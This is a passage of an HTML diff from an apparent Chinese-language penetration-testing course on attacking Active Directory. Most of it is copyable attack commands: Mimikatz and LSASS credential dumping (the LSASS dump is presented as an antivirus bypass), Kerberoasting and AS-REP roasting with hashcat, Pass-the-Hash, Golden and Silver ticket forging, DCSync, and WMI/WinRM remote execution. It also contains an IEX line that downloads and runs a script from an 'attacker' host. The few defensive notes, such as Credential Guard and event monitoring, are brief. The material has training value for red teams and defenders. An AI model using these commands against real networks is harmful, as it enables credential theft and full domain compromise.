+<span class="cm">REM 提取所有登入過的用戶的 NTLM Hash 和明文密碼（Win 8.1+ 默認無明文）</span>
+mimikatz # sekurlsa::logonpasswords
+
+<span class="cm">REM 只提取 NTLM Hash</span>
+mimikatz # sekurlsa::msv
+
+<span class="cm">REM 提取 Kerberos Ticket（保存到文件，可用於 Pass-the-Ticket）</span>
+mimikatz # sekurlsa::tickets /export
+
+<span class="cm">REM ─── 從 SAM 資料庫提取本地帳號 Hash ───</span>
+mimikatz # lsadump::sam
+
+<span class="cm">REM ─── 從域控的 NTDS.dit 提取所有域帳號 Hash（需域控本地 SYSTEM 或 DCSync 權限）───</span>
+mimikatz # lsadump::lsa /patch        <span class="cm">REM 在 DC 本機執行</span>
+mimikatz # lsadump::dcsync /user:Administrator  <span class="cm">REM DCSync 遠端模擬</span>
+
+<span class="cm">REM ─── 繞過防毒：LSASS 記憶體傾倒（更隱蔽的方式）───</span>
+<span class="cm">REM 用 Windows 內建工具傾倒 LSASS，再在本機離線分析</span>
+<span class="cm">REM 方法1：Task Manager 右鍵 lsass.exe → Create Dump File</span>
+<span class="cm">REM 方法2：comsvcs.dll（Windows 內建）</span>
+rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 688 C:\lsass.dmp full
+<span class="cm">REM 688 是 LSASS 的 PID（用 tasklist 查詢）</span>
+
+<span class="cm">REM 傾倒後在 Kali 上離線分析：</span>
+python3 -c "import pypykatz; pypykatz lsa minidump lsass.dmp"</pre>
+</div>
+
+<div class="note warn">
+  <div class="note-lbl">Windows 10 / 11 防護措施</div>
+  <p>Windows 10 1607+ 可開啟 <strong>Credential Guard</strong>（基於虛擬化的保護）：將 LSASS 隔離到獨立的虛擬容器中，Mimikatz 無法從中提取明文密碼或 NTLM Hash。啟用了 Credential Guard 的系統需要改用 Kerberoasting、DCSync 等替代手段獲取憑證。</p>
+</div>
+</div>
+
+
+<!-- ===== CH2: Active Directory 基礎 ===== -->
+
+<!-- L2-1 AD 架構 -->
+<div class="cb" id="l2-1">
+<h2>AD 架構：域 / 樹 / 森林 / 信任</h2>
+<p>Active Directory 是企業內網的核心，理解其架構是進行域滲透的先決條件。AD 採用層次化的命名空間結構，安全邊界和信任關係決定了橫向移動的可能路徑。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th>概念</th><th>說明</th><th>攻擊意義</th></tr></thead>
+    <tbody>
+      <tr><td><strong>域（Domain）</strong></td><td>AD 的基本管理單位（如 corp.local）。域內的所有用戶、電腦、群組共享同一份目錄數據庫（NTDS.dit），由域控制器（DC）管理。</td><td>取得 Domain Admin = 控制整個域的所有資源</td></tr>
+      <tr><td><strong>樹（Tree）</strong></td><td>共享連續命名空間的多個域（如 corp.local + hk.corp.local + us.corp.local）。父子域之間自動建立雙向傳遞信任。</td><td>父子域信任可用於跨域攻擊（子域到父域）</td></tr>
+      <tr><td><strong>森林（Forest）</strong></td><td>共享 Schema 和 Configuration 的多棵樹的集合。是 AD 的最大安全邊界。森林根域（Forest Root Domain）持有最高特權。</td><td>森林信任（Forest Trust）是跨森林攻擊的橋樑</td></tr>
+      <tr><td><strong>信任（Trust）</strong></td><td>允許一個域的用戶訪問另一個域資源的授權關係。分為單向/雙向、傳遞性/非傳遞性。</td><td>枚舉信任關係是跨域滲透的第一步</td></tr>
+      <tr><td><strong>OU（組織單位）</strong></td><td>域內的邏輯容器，用於組織對象和應用群組策略（GPO）。</td><td>高特權 OU 的 GPO 可部署惡意腳本到所有成員</td></tr>
+      <tr><td><strong>GPO（群組策略）</strong></td><td>集中配置域成員電腦和用戶設定的機制。可部署軟件、執行腳本、配置安全設定。</td><td>修改 GPO = 控制所有受影響的機器（高價值目標）</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">AD 架構枚舉（PowerShell / net 命令）</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 基本域信息 ───</span>
+<span class="cm"># PowerShell（使用 .NET 內建類，無需額外工具）</span>
+$domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$domain.Name              <span class="cm"># 域名</span>
+$domain.DomainControllers <span class="cm"># 所有域控制器</span>
+$domain.Parent            <span class="cm"># 父域（樹中）</span>
+
+<span class="cm"># 獲取域的 SID（Golden Ticket 製作時需要）</span>
+(New-Object System.Security.Principal.NTAccount("corp.local\Domain Admins")).Translate([System.Security.Principal.SecurityIdentifier]).Value.ToString().TrimEnd('-512')
+
+<span class="cm"># ─── 枚舉信任關係 ───</span>
+$forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
+$forest.GetAllTrustRelationships()    <span class="cm"># 森林內所有信任</span>
+$domain.GetAllTrustRelationships()    <span class="cm"># 當前域的信任</span>
+
+nltest /domain_trusts                 <span class="cm"># 命令列（列出所有信任域）</span>
+
+<span class="cm"># ─── 枚舉域控制器 ───</span>
+nltest /dclist:corp.local
+nslookup -type=SRV _ldap._tcp.corp.local    <span class="cm"># DNS 查詢定位 DC</span>
+
+<span class="cm"># ─── 枚舉 GPO ───</span>
+Get-GPO -All -Domain corp.local | Select DisplayName,Id,GpoStatus
+<span class="cm"># 找到「高特權 OU 的 GPO」→ 如果可以修改 GPO = 代碼執行</span></pre>
+</div>
+</div>
+
+<!-- L2-2 Kerberos 認證 -->
+<div class="cb" id="l2-2">
+<h2>Kerberos 認證協議深入解析</h2>
+<p>Kerberos 是 AD 環境中的標準認證協議，理解其工作流程是掌握 Kerberoasting、Golden Ticket、Pass-the-Ticket 等多種攻擊技術的前提。</p>
+
+<h3>Kerberos 認證流程</h3>
+<div class="atkflow">
+  <div class="af-step s1"><span class="af-n">AS-REQ</span><div><div class="af-t">用戶向 KDC 請求 TGT</div><div class="af-d">用戶客戶端向 KDC（Key Distribution Center，在 DC 上）發送 AS-REQ，包含用戶名和使用用戶密碼 Hash 加密的時間戳。若帳號設置了「不需要預認證」（Kerberos Pre-Auth 禁用），則 KDC 不驗證身份直接返回加密數據，這是 AS-REP Roasting 的利用點。</div></div></div>
+  <div class="af-step s2"><span class="af-n">AS-REP</span><div><div class="af-t">KDC 返回 TGT</div><div class="af-d">KDC 驗證後，返回 AS-REP：包含 TGT（Ticket Granting Ticket），使用 krbtgt 帳號的 NTLM Hash 加密。客戶端只能使用 TGT，無法解密它。TGT 預設有效期 10 小時。</div></div></div>
+  <div class="af-step s3"><span class="af-n">TGS-REQ</span><div><div class="af-t">用戶請求服務票證（ST）</div><div class="af-d">用戶要訪問某服務（如 MSSQL），將 TGT 發送給 KDC，請求該服務的 Service Ticket（ST）。請求中包含目標服務的 SPN（Service Principal Name），如 MSSQLSvc/sqlserver.corp.local:1433。</div></div></div>
+  <div class="af-step s4"><span class="af-n">TGS-REP</span><div><div class="af-t">KDC 返回服務票證</div><div class="af-d">KDC 使用目標服務帳號的 NTLM Hash 加密服務票證，返回給客戶端。關鍵點：服務票證是用服務帳號的 Hash 加密的，可以對其進行離線爆破——這就是 Kerberoasting。</div></div></div>
+  <div class="af-step s5"><span class="af-n">AP-REQ</span><div><div class="af-t">客戶端向服務出示票證</div><div class="af-d">客戶端將服務票證提交給目標服務，服務用自己的 Hash 解密驗證，無需聯繫 KDC。這意味著：如果攻擊者有 krbtgt Hash，可以偽造任意 TGT（Golden Ticket）；有服務 Hash，可以偽造服務票證（Silver Ticket）。</div></div></div>
+</div>
+
+<div class="note sec">
+  <div class="note-lbl">關鍵 Hash 對應</div>
+  <p><strong>krbtgt Hash</strong> → 可偽造任意 TGT（Golden Ticket），等於永久控制整個域。<br>
+  <strong>服務帳號 Hash</strong> → 可偽造對應服務的 ST（Silver Ticket），可以在不聯繫 KDC 的情況下訪問服務。<br>
+  <strong>NTLM Hash</strong> → Pass-the-Hash 攻擊，或提交給 KDC 做 Pass-the-Key 認證。</p>
+</div>
+</div>
+
+<!-- L2-3 BloodHound -->
+<div class="cb" id="l2-3">
+<h2>LDAP 查詢與 BloodHound 域枚舉</h2>
+<p>BloodHound 是內網滲透最重要的偵察工具之一，通過收集 AD 關係圖（用戶、電腦、群組、ACL、Session 等），利用圖論算法自動找出從當前低權限帳號到 Domain Admin 的最短攻擊路徑。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">BloodHound — 完整使用流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── STEP 1：部署 BloodHound（攻擊機）───</span>
+<span class="cm"># 安裝 Neo4j 資料庫（BloodHound 使用圖資料庫）</span>
+apt install neo4j -y
+neo4j console                   <span class="cm"># 啟動（預設 http://localhost:7474）</span>
+<span class="cm"># 首次登入修改密碼：neo4j / neo4j → 改為自訂密碼</span>
+
+<span class="cm"># 啟動 BloodHound GUI</span>
+./BloodHound --no-sandbox
+
+<span class="cm"># ─── STEP 2：用 SharpHound 採集器收集 AD 數據 ───</span>
+<span class="cm"># 在已加入域的 Windows 機器上執行（需域用戶權限即可，無需管理員）：</span>
+
+<span class="cm"># 方法1：SharpHound.exe（C# 二進制）</span>
+SharpHound.exe -c All --zipfilename bloodhound_data.zip
+
+<span class="cm"># 方法2：SharpHound.ps1（PowerShell 模組）</span>
+Import-Module SharpHound.ps1
+Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp\
+
+<span class="cm"># 方法3：bloodhound-python（從 Linux 遠端採集，需域憑證）</span>
+pip3 install bloodhound
+bloodhound-python -u 'jdoe' -p 'Password1' -d corp.local \
+  -dc dc01.corp.local -c All -ns 192.168.1.10
+<span class="cm"># 輸出 JSON 文件，無需在目標 Windows 上執行任何工具</span>
+
+<span class="cm"># ─── STEP 3：上傳數據到 BloodHound ───</span>
+<span class="cm"># 在 BloodHound GUI 中：Upload Data → 選擇 .zip 或 JSON 文件</span>
+
+<span class="cm"># ─── STEP 4：使用 BloodHound 分析（關鍵查詢）───</span>
+<span class="cm"># GUI 中的 Pre-built Queries（預設查詢）：</span>
+<span class="cm"># - Find Shortest Paths to Domain Admins           → 最短提權路徑</span>
+<span class="cm"># - Find Principals with DCSync Rights             → 誰有 DCSync 權限</span>
+<span class="cm"># - Find Computers where Domain Users are Local Admin → 哪些電腦域用戶是本地管理員</span>
+<span class="cm"># - Shortest Path from Kerberoastable Users         → Kerberoastable 帳號到 DA 的路徑</span>
+
+<span class="cm"># ─── Cypher 自訂查詢 ───</span>
+<span class="cm"># 找到所有 Kerberoastable 帳號（有 SPN 且非禁用）</span>
+MATCH (u:User {hasspn:true,enabled:true}) RETURN u.name,u.serviceprincipalnames</pre>
+</div>
+</div>
+
+<!-- L2-4 PowerView -->
+<div class="cb" id="l2-4">
+<h2>PowerView / ADExplorer 偵察</h2>
+<p>PowerView 是 PowerSploit 框架中的 AD 偵察模組，提供豐富的 PowerShell 函數用於枚舉 AD 對象，比原生命令更強大且返回結構化對象。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">PowerView — 常用枚舉命令</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># 載入 PowerView（需要先 Bypass AMSI 和執行策略）</span>
+Set-ExecutionPolicy Bypass -Scope Process -Force
+IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')
+
+<span class="cm"># ─── 域信息 ───</span>
+Get-Domain                            <span class="cm"># 當前域信息</span>
+Get-DomainController                  <span class="cm"># 所有 DC</span>
+Get-DomainSID                         <span class="cm"># 域 SID</span>
+Get-DomainTrust                       <span class="cm"># 所有信任關係</span>
+
+<span class="cm"># ─── 用戶枚舉 ───</span>
+Get-DomainUser                        <span class="cm"># 所有域用戶（詳細屬性）</span>
+Get-DomainUser -SPN                   <span class="cm"># 有 SPN 的用戶（Kerberoasting 目標）</span>
+Get-DomainUser -PreauthNotRequired    <span class="cm"># 不需預認證（AS-REP Roasting 目標）</span>
+Get-DomainUser -AdminCount            <span class="cm"># adminCount=1 的高特權帳號</span>
+Get-DomainUser jdoe | Select *        <span class="cm"># 指定用戶所有屬性</span>
+
+<span class="cm"># ─── 電腦枚舉 ───</span>
+Get-DomainComputer                    <span class="cm"># 所有域內電腦</span>
+Get-DomainComputer -OperatingSystem "*Server*"  <span class="cm"># 過濾伺服器</span>
+Get-DomainComputer -Unconstrained     <span class="cm"># 配置了非約束委派的機器（高價值！）</span>
+
+<span class="cm"># ─── 群組枚舉 ───</span>
+Get-DomainGroup "Domain Admins" | Select Members
+Get-DomainGroupMember "Domain Admins" -Recurse  <span class="cm"># 遞迴展開嵌套群組</span>
+
+<span class="cm"># ─── ACL 分析（找到錯誤配置的 AD 權限）───</span>
+<span class="cm"># 找到當前用戶對哪些對象有 GenericAll/WriteDACL/WriteOwner 等危險權限</span>
+Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -eq "jdoe" }
+
+<span class="cm"># ─── 找到當前用戶有本地管理員權限的機器 ───</span>
+Find-LocalAdminAccess -Verbose        <span class="cm"># 對所有域電腦測試（有噪音！）</span>
+
+<span class="cm"># ─── Session 枚舉（找目標用戶登入了哪台機器）───</span>
+Get-NetSession -ComputerName dc01.corp.local    <span class="cm"># DC 上有哪些活躍 Session</span>
+Get-DomainUserEvent -Identity "Administrator"  <span class="cm"># 追蹤管理員登入事件</span></pre>
+</div>
+
+<div class="quiz">
+  <div class="q-lbl">小測驗</div>
+  <div class="q-q">在域滲透中，攻擊者使用 BloodHound 收集數據後，發現用戶 jdoe 的賬號屬性中 <code>hasspn:true</code>。這意味著可以對 jdoe 發動哪種攻擊？</div>
+  <div class="q-opts">
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">A</span>AS-REP Roasting（不需要預認證攻擊）</div>
+    <div class="qo" onclick="chkQ(this,true)"><span class="qo-k">B</span>Kerberoasting（請求服務票證並離線爆破 Hash）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">C</span>Pass-the-Hash（直接使用 NTLM Hash 認證）</div>
+    <div class="qo" onclick="chkQ(this,false)"><span class="qo-k">D</span>DCSync（模擬域控拉取所有帳號 Hash）</div>
+  </div>
+  <div class="q-exp">正確！hasspn:true 表示該帳號設置了服務主體名稱（SPN），意味著它是一個服務帳號。Kerberoasting 的原理是：任何域用戶都可以向 KDC 請求有 SPN 帳號的服務票證（TGS），而該票證是用服務帳號的 NTLM Hash 加密的，可以在離線環境中暴力破解。AS-REP Roasting 對應的是 PreauthNotRequired:true（不需預認證）屬性；Pass-the-Hash 需要先獲得 Hash；DCSync 需要特殊 AD 複製權限。</div>
+</div>
+</div>
+
+
+<!-- ===== CH3: 域攻擊技術 ===== -->
+
+<!-- L3-1 Kerberoasting -->
+<div class="cb" id="l3-1">
+<h2>Kerberoasting：服務帳號 Hash 提取</h2>
+<p>Kerberoasting 是域滲透中最常用、最有效的攻擊之一：任何域用戶（即使是最低權限）都可以請求有 SPN 服務帳號的服務票證，然後對票證進行離線爆破，無需與目標服務交互，幾乎不產生告警。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Kerberoasting 完整攻擊流程</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── STEP 1：枚舉 Kerberoastable 帳號（有 SPN 的服務帳號）───</span>
+
+<span class="cm"># 方法1：PowerView（域內 Windows 機器）</span>
+Get-DomainUser -SPN | Select SamAccountName,ServicePrincipalName
+
+<span class="cm"># 方法2：Impacket GetUserSPNs（從 Linux 遠端執行）</span>
+GetUserSPNs.py corp.local/jdoe:Password1 -dc-ip 192.168.1.10
+
+<span class="cm"># ─── STEP 2：請求服務票證並導出 Hash ───</span>
+
+<span class="cm"># 方法1：Rubeus（Windows，功能最全）</span>
+Rubeus.exe kerberoast /outfile:hashes.txt         <span class="cm"># 提取所有 Kerberoastable 帳號</span>
+Rubeus.exe kerberoast /user:svc_sql /outfile:sql.txt  <span class="cm"># 指定帳號</span>
+Rubeus.exe kerberoast /rc4opsec /outfile:hashes.txt   <span class="cm"># 只請求 RC4 加密（更易爆破）</span>
+
+<span class="cm"># 方法2：Impacket GetUserSPNs（從 Linux 一步完成枚舉+提取）</span>
+GetUserSPNs.py corp.local/jdoe:Password1 -dc-ip 192.168.1.10 -request -outputfile hashes.txt
+
+<span class="cm"># 方法3：PowerView + Invoke-Kerberoast（純 PowerShell）</span>
+Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File hashes.txt
+
+<span class="cm"># ─── STEP 3：離線爆破 Hash ───</span>
+<span class="cm"># Hash 格式：$krb5tgs$23$*svc_sql*corp.local*MSSQLSvc/sql01:1433*...$...</span>
+<span class="cm"># hashcat 模式：13100（Kerberos TGS-REP RC4）或 19600（AES256）</span>
+
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
+hashcat -m 19600 hashes.txt /usr/share/wordlists/rockyou.txt  <span class="cm"># AES256 加密更慢</span>
+
+<span class="cm"># ─── 防禦措施 ───</span>
+<span class="cm"># 1. 服務帳號使用強密碼（25+ 字元隨機密碼，使用 GMSA）</span>
+<span class="cm"># 2. 啟用 AES256 加密（RC4 更易爆破，禁用 RC4 可提高難度）</span>
+<span class="cm"># 3. 監控：4769 事件（Kerberos Service Ticket Operations），票證加密類型 0x17 = RC4</span></pre>
+</div>
+</div>
+
+<!-- L3-2 AS-REP Roasting -->
+<div class="cb" id="l3-2">
+<h2>AS-REP Roasting：無預認證攻擊</h2>
+<p>AS-REP Roasting 針對禁用了 Kerberos 預認證（Do not require Kerberos preauthentication）的帳號。攻擊者無需任何密碼，直接向 KDC 發送 AS-REQ，KDC 會返回用目標帳號密碼加密的 AS-REP，可以對其進行離線爆破。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">AS-REP Roasting 攻擊</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── STEP 1：枚舉不需要預認證的帳號 ───</span>
+Get-DomainUser -PreauthNotRequired | Select SamAccountName  <span class="cm"># PowerView</span>
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} | Select Name  <span class="cm"># AD 模組</span>
+
+<span class="cm"># ─── STEP 2：請求 AS-REP Hash（無需密碼！）───</span>
+
+<span class="cm"># 方法1：Rubeus（Windows）</span>
+Rubeus.exe asreproast /outfile:asrep_hashes.txt
+Rubeus.exe asreproast /user:svc_backup /outfile:asrep.txt
+
+<span class="cm"># 方法2：Impacket GetNPUsers（從 Linux，無需域帳號，只需用戶列表）</span>
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 192.168.1.10
+GetNPUsers.py corp.local/ -no-pass -dc-ip 192.168.1.10  <span class="cm"># 嘗試枚舉所有用戶</span>
+
+<span class="cm"># ─── STEP 3：離線爆破 ───</span>
+<span class="cm"># Hash 格式：$krb5asrep$23$svc_backup@corp.local:...$...</span>
+hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
+
+<span class="cm"># ─── 關鍵差異對比 ───</span>
+<span class="cm"># Kerberoasting：需要域帳號憑證，針對有 SPN 的帳號</span>
+<span class="cm"># AS-REP Roasting：完全不需要憑證，只需知道用戶名，針對禁用預認證的帳號</span></pre>
+</div>
+</div>
+
+<!-- L3-3 Pass-the-Hash / Pass-the-Ticket -->
+<div class="cb" id="l3-3">
+<h2>Pass-the-Hash / Pass-the-Ticket</h2>
+<p>Pass-the-Hash（PtH）和 Pass-the-Ticket（PtT）是橫向移動的核心技術，允許攻擊者在不知道明文密碼的情況下，直接使用 NTLM Hash 或 Kerberos Ticket 進行認證。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Pass-the-Hash 與 Pass-the-Ticket</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── Pass-the-Hash（使用 NTLM Hash 認證）───</span>
+<span class="cm"># 格式：LMHash:NTHash（LM Hash 通常為 aad3b435b51404eeaad3b435b51404ee）</span>
+<span class="cm"># 示例 Hash：aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C</span>
+
+<span class="cm"># 方法1：Impacket（推薦，功能全面）</span>
+psexec.py -hashes aad3b435...:8846F7EA... corp.local/Administrator@192.168.1.100
+wmiexec.py -hashes aad3b435...:8846F7EA... corp.local/Administrator@192.168.1.100
+smbclient.py -hashes aad3b435...:8846F7EA... corp.local/Administrator@192.168.1.100
+
+<span class="cm"># 方法2：CrackMapExec（批量測試多台主機）</span>
+crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846F7EAEE8FB117AD06BDD830B7586C
+crackmapexec smb 192.168.1.0/24 -u Administrator -H 8846F7EA... --exec-method wmiexec -x whoami
+
+<span class="cm"># 方法3：Mimikatz（在 Windows 目標機上）</span>
+mimikatz # sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:8846F7EAEE8FB117AD06BDD830B7586C /run:cmd.exe
+<span class="cm"># 會彈出一個具有 Administrator 身份的 CMD 窗口</span>
+
+<span class="cm"># ─── Pass-the-Ticket（使用 Kerberos Ticket）───</span>
+
+<span class="cm"># STEP 1：導出當前機器上的 Ticket</span>
+mimikatz # sekurlsa::tickets /export    <span class="cm"># 導出所有 .kirbi 文件</span>
+Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap   <span class="cm"># 導出 TGT（Base64）</span>
+
+<span class="cm"># STEP 2：注入 Ticket 到當前進程</span>
+mimikatz # kerberos::ptt ticket.kirbi   <span class="cm"># 注入 .kirbi 文件</span>
+Rubeus.exe ptt /ticket:doIFuj...==      <span class="cm"># 注入 Base64 Ticket</span>
+
+<span class="cm"># STEP 3：使用注入的 Ticket 訪問資源</span>
+dir \\dc01.corp.local\C$               <span class="cm"># 以 Ticket 中用戶身份訪問</span>
+klist                                  <span class="cm"># 查看當前進程持有的 Ticket</span></pre>
+</div>
+</div>
+
+<!-- L3-4 Golden / Silver Ticket -->
+<div class="cb" id="l3-4">
+<h2>Golden Ticket / Silver Ticket 偽造</h2>
+<p>Golden Ticket 是內網滲透中最強大的持久化手段之一：利用 krbtgt 帳號的 Hash 偽造任意合法 TGT，可以以任意用戶（包括不存在的用戶）的身份訪問域內任何資源，有效期可設置為數年。</p>
+
+<div class="tbl">
+  <table class="t">
+    <thead><tr><th></th><th>Golden Ticket</th><th>Silver Ticket</th></tr></thead>
+    <tbody>
+      <tr><td><strong>使用的 Hash</strong></td><td>krbtgt NTLM Hash</td><td>目標服務帳號 NTLM Hash</td></tr>
+      <tr><td><strong>偽造的 Ticket</strong></td><td>TGT（票證授權票證）</td><td>ST（服務票證）</td></tr>
+      <tr><td><strong>訪問範圍</strong></td><td>域內所有服務（無限制）</td><td>僅限指定服務（如 CIFS/HOST/HTTP）</td></tr>
+      <tr><td><strong>需要 KDC 通訊</strong></td><td>否（自包含，可離線使用）</td><td>否（直接提交給目標服務）</td></tr>
+      <tr><td><strong>危害程度</strong></td><td>極高（完全控制域，域密碼重置也無效）</td><td>高（控制特定服務，更隱蔽）</td></tr>
+      <tr><td><strong>防禦/失效方式</strong></td><td>只有重置 krbtgt 密碼兩次才能使其失效</td><td>修改服務帳號密碼即可失效</td></tr>
+    </tbody>
+  </table>
+</div>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">Golden Ticket 製作與使用</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 前提：需要以下信息 ───</span>
+<span class="cm"># 1. 域名（corp.local）</span>
+<span class="cm"># 2. 域 SID（S-1-5-21-xxx-xxx-xxx）</span>
+<span class="cm"># 3. krbtgt NTLM Hash（通過 DCSync 或 lsadump::lsa 獲取）</span>
+<span class="cm"># 4. 要偽造的用戶名（可以是任意字串，包括不存在的用戶）</span>
+
+<span class="cm"># ─── 獲取域 SID ───</span>
+whoami /user   <span class="cm"># 查看當前用戶的 SID，去掉最後的 -RID 部分</span>
+<span class="cm"># 例：S-1-5-21-1234567890-987654321-123456789-1105 → 域 SID = S-1-5-21-1234567890-987654321-123456789</span>
+
+<span class="cm"># ─── 方法1：Mimikatz 製作 Golden Ticket ───</span>
+mimikatz # kerberos::golden /user:FakeAdmin /domain:corp.local \
+  /sid:S-1-5-21-1234567890-987654321-123456789 \
+  /krbtgt:9d765b482771505cbe97411065f5c70c \
+  /ticket:golden.kirbi
+<span class="cm"># 注入 Ticket</span>
+mimikatz # kerberos::ptt golden.kirbi
+<span class="cm"># 使用</span>
+dir \\dc01.corp.local\C$
+
+<span class="cm"># ─── 方法2：Rubeus 製作 Golden Ticket ───</span>
+Rubeus.exe golden /user:FakeAdmin /domain:corp.local \
+  /sid:S-1-5-21-1234567890-987654321-123456789 \
+  /rc4:9d765b482771505cbe97411065f5c70c \
+  /nowrap    <span class="cm"># 輸出 Base64</span>
+
+Rubeus.exe ptt /ticket:doIFuj...==
+
+<span class="cm"># ─── Silver Ticket（針對特定服務）───</span>
+mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
+  /sid:S-1-5-21-1234567890-987654321-123456789 \
+  /target:dc01.corp.local \
+  /service:cifs \
+  /rc4:&lt;服務帳號或電腦帳號 Hash&gt; \
+  /ticket:silver.kirbi
+<span class="cm"># /service:cifs → 可訪問文件共享</span>
+<span class="cm"># /service:host → 可執行 WMI / Task Schedule</span>
+<span class="cm"># /service:http → 可訪問 Web 服務</span></pre>
+</div>
+</div>
+
+<!-- L3-5 DCSync -->
+<div class="cb" id="l3-5">
+<h2>DCSync：模擬域控拉取 Hash</h2>
+<p>DCSync 是利用 AD 複製機制（DS-Replication-Get-Changes）的攻擊，通過模擬域控向真實 DC 發起複製請求，無需在 DC 本機執行任何代碼，即可遠端拉取所有域帳號（包括 krbtgt）的 NTLM Hash。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">DCSync 攻擊執行</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── 前提：需要以下任一權限 ───</span>
+<span class="cm"># - Domain Admin / Enterprise Admin</span>
+<span class="cm"># - 在域根對象上有 DS-Replication-Get-Changes 和 DS-Replication-Get-Changes-All 權限</span>
+<span class="cm"># 後者可通過 ACL 錯誤配置獲得（BloodHound 可以找到）</span>
+
+<span class="cm"># ─── 方法1：Mimikatz DCSync（Windows）───</span>
+<span class="cm"># 拉取 krbtgt Hash（製作 Golden Ticket 的關鍵）</span>
+mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
+<span class="cm"># 輸出包含：Hash NTLM: 9d765b482771505cbe97411065f5c70c</span>
+
+<span class="cm"># 拉取指定用戶 Hash</span>
+mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
+
+<span class="cm"># 拉取所有帳號 Hash（相當於 NTDS.dit 全量導出）</span>
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+
+<span class="cm"># ─── 方法2：Impacket secretsdump（從 Linux 遠端執行）───</span>
+<span class="cm"># 使用憑證</span>
+secretsdump.py corp.local/Administrator:Password1@192.168.1.10
+<span class="cm"># 使用 Hash（Pass-the-Hash + DCSync）</span>
+secretsdump.py -hashes aad3b435...:8846F7EA... corp.local/Administrator@192.168.1.10
+<span class="cm"># 輸出格式：域名\用戶名:RID:LMHash:NTHash</span>
+<span class="cm"># corp.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846F7EAEE8FB117AD06BDD830B7586C:::</span>
+<span class="cm"># corp.local\krbtgt:502:aad3b435...:9d765b482771505cbe97411065f5c70c:::</span>
+
+<span class="cm"># ─── DCSync 權限審計（誰有 DCSync 權限）───</span>
+<span class="cm"># BloodHound 查詢：Find Principals with DCSync Rights</span>
+<span class="cm"># PowerView 手動檢查：</span>
+Get-DomainObjectAcl "DC=corp,DC=local" -ResolveGUIDs | Where-Object {
+    $_.ObjectAceType -match "DS-Replication" -and
+    $_.ActiveDirectoryRights -match "ExtendedRight"
+} | Select-Object IdentityReference,ObjectAceType</pre>
+</div>
+</div>
+
+
+<!-- ===== CH4: 橫向移動 ===== -->
+
+<!-- L4-1 WMI / WinRM -->
+<div class="cb" id="l4-1">
+<h2>WMI / WinRM 遠端執行</h2>
+<p>WMI（Windows Management Instrumentation）和 WinRM（Windows Remote Management）是 Windows 內建的遠端管理協議，在內網中幾乎無處不在，常被紅隊用於隱蔽的橫向移動（產生的日誌比 PsExec 少）。</p>
+
+<div class="cblock">
+  <div class="ctop"><span class="clang">WMI 與 WinRM 遠端執行</span><button class="ccopy" onclick="cpCode(this)">複製</button></div>
+  <pre><span class="cm"># ─── WMI 遠端執行（端口 135 / 動態 RPC）───</span>
+
+<span class="cm"># 方法1：wmic 命令（Windows 內建，無需工具）</span>
+wmic /node:192.168.1.100 /user:corp\Administrator /password:Password1 \
+  process call create "cmd.exe /c whoami > C:\output.txt"
+
+<span class="cm"># 方法2：PowerShell Invoke-WmiMethod</span>
+$cred = New-Object System.Management.Automation.PSCredential("corp\Administrator",
+  (ConvertTo-SecureString "Password1" -AsPlainText -Force))
+Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd /c whoami > C:\out.txt" \
+  -ComputerName 192.168.1.100 -Credential $cred
+
+<span class="cm"># 方法3：Impacket wmiexec（從 Linux，取得互動 Shell）</span>
+wmiexec.py corp.local/Administrator:Password1@192.168.1.100
+wmiexec.py -hashes :8846F7EAEE8FB117AD06BDD830B7586C corp.local/Administrator@192.168.1.100
+
+<span class="cm"># ─── WinRM / Evil-WinRM（端口 5985 HTTP / 5986 HTTPS）───</span>
+<span class="cm"># WinRM 提供完整的 PowerShell 互動 Shell，功能最強</span>
+
+<span class="cm"># 確認 WinRM 是否開啟</span>
+crackmapexec winrm 192.168.1.0/24          <span class="cm"># 批量掃描</span>
